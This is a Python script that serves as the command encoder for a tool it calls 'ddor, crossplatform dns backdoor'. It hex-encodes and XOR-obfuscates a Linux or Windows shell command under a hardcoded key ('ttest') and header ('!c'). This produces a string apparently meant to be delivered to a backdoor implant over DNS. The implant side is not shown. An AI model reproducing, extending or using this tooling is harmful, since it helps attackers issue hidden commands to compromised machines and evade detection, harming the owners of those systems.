#!/usr/bin/python3
import binascii
import colorama
import argparse
from itertools import cycle

header = "!c"
xor_key = "ttest"

banner = colorama.Fore.GREEN +'''@@@@@@@   @@@@@@@    @@@@@@    @@@@@@   @@@@@@@   
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  
@!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@!!@!   
!@!  !!!  !@!  !!!  !@!  !!!  !@!  !!!  !!@!@!    
!!:  !!!  !!:  !!!  !!:  !!!  !!:  !!!  !!: :!!   
:!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  
 :::: ::   :::: ::  ::::: ::  ::::: ::  ::   :::  
:: :  :   :: :  :    : :  :    : :  :    :   : :  ''' + colorama.Style.RESET_ALL

def str_xor(data, key):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
    return xored

def h_encode(txt):
    return binascii.hexlify(txt.encode("utf-8")).decode("utf-8")

if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(description='ddor, crossplatform dns backdoor')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-l', action="store", dest="linux_cmd", help="Linux Command", default="")
    group.add_argument('-w', action="store", dest="windows_cmd", help="Windows Command", default="")
    args = parser.parse_args()
    print("Using Header: '{}' Using Xor Pass: '{}'".format(header, xor_key))
    encoded_header = h_encode(header + args.linux_cmd + "!&" + args.windows_cmd)
    encypted_header = h_encode(str_xor(encoded_header, xor_key))
    print("\t>> {} <<".format(encypted_header))
    #print(str_xor(bytearray.fromhex(encypted_header).decode("utf-8"), xor_key))